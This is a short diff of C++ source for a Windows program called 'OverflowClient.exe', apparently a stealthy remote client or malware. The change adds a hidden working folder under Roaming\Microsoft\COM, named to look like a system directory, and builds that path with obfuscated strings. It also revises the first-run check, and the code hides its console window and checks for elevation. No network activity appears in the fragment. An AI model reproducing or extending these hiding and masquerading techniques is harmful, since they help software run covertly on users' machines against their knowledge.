@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <thread>
 #include <iostream>
+#include <filesystem>
 
 #include "gui\gui.h"
 #include "client/client.h"
@@ -8,10 +9,18 @@
 #include "utility/requests.h"
 #include "utility\helper.h"
 #include "client/functions.h"
+#include "utility/task_manager.h"
+#include "client/communication.h"
 
 int main(int argc, char* argv[]) {
 	/* Hide Console */
 	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+
+	/* Set Path */
+	client::PATH = helpers::roaming + xorstr_("\\Microsoft\\COM\\");
+
+	/* Create Folder */
+	std::filesystem::create_directory(helpers::roaming + "\\Microsoft\\COM");
 
 	if (std::string(argv[0]).find("OverflowClient.exe") != std::string::npos) {
 		/* Check If Elevated */
@@ -22,7 +31,7 @@ int main(int argc, char* argv[]) {
 
 		/* Create and Run Client */
 		std::thread client;
-		if (!helpers::is_initialized()) {
+		if (client::communication::get_profile("initialized") != "1" && !helpers::is_process_running(client::STARTUP_FILE_NAME.c_str())) {
 			client = std::thread(client::init);
 		}
 
